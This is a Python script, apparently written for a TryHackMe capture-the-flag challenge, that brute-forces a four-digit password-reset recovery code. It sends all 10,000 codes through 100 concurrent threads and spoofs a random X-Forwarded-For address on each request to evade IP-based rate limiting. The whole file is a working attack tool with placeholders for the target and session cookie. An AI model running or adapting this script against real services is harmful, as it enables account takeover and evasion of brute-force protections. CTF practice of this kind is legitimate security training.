import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# Target configuration - Updated for your CTF challenge
TARGET_IP = "IP_ADRESINIZ" #değiştir
TARGET_PORT = "1337"
SESSION_COOKIE = "PHP_COOKIENIZ" #değiştir

# URL for password reset form
RESET_PASSWORD_URL = f"http://{TARGET_IP}:{TARGET_PORT}/reset_password.php"

# HTTP request headers (without X-Forwarded-For)
REQUEST_HEADERS = {
    "Host": f"{TARGET_IP}:{TARGET_PORT}",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"http://{TARGET_IP}:{TARGET_PORT}",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": f"http://{TARGET_IP}:{TARGET_PORT}/reset_password.php",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "Cookie": f"PHPSESSID={SESSION_COOKIE}"
}

# Custom exception to signal when the correct recovery code is found
class CorrectCodeFoundException(Exception):
    pass

def generate_recovery_codes():
    """Generator to yield all possible 4-digit recovery codes."""
    for code in range(10000):
        yield f"{code:04d}"  # Zero-padded 4-digit code, e.g., "0001"

def send_recovery_request(recovery_code):
    """
    Sends a POST request to the reset password endpoint with a given recovery code.
    
    Args:
        recovery_code (str): The recovery code to try.
    
    Raises:
        CorrectCodeFoundException: If the correct recovery code is found.
    """
    # Randomly generate an X-Forwarded-For IP address
    random_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    # Update request headers with the random IP
    headers_with_random_ip = REQUEST_HEADERS.copy()
    headers_with_random_ip["X-Forwarded-For"] = random_ip
    
    # Data payload for the POST request
    data_payload = {
        "recovery_code": recovery_code,
        "s": "179"  # Replace with the correct hidden field value if necessary
    }

    try:
        # Send the POST request
        response = requests.post(RESET_PASSWORD_URL, headers=headers_with_random_ip, data=data_payload, timeout=3)
        
        # Check if the response indicates a successful recovery code
        if "Invalid or expired recovery code!" not in response.text:
            print(f"\n[SUCCESS] The correct recovery code is: {recovery_code}")
            print(f"Response preview: {response.text[:200]}")
            raise CorrectCodeFoundException  # Signal to stop further processing
    except requests.RequestException as e:
        # Handle request exceptions (suppress most errors to avoid spam)
        pass

def brute_force_recovery_code():
    """Attempts to brute-force the recovery code using multiple threads."""
    print("[*] Starting brute-force attack...")
    tried = 0
    try:
        # ThreadPoolExecutor to handle multiple threads for concurrent requests
        with ThreadPoolExecutor(max_workers=100) as executor:
            # Submit tasks for each generated recovery code
            future_to_code_mapping = {executor.submit(send_recovery_request, code): code for code in generate_recovery_codes()}
            
            for future in as_completed(future_to_code_mapping):
                tried += 1
                if tried % 500 == 0:
                    print(f"[*] Tried {tried}/10000 codes...")
                try:
                    future.result()  # Will raise CorrectCodeFoundException if the correct code is found
                except CorrectCodeFoundException:
                    raise
    except CorrectCodeFoundException:
        print("[*] Correct recovery code found, terminating brute-force process.")

if __name__ == "__main__":
    print("[*] Starting the TryHackMe CTF brute-force attack...")
    print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
    brute_force_recovery_code()
    print("[*] Brute-force process completed!")
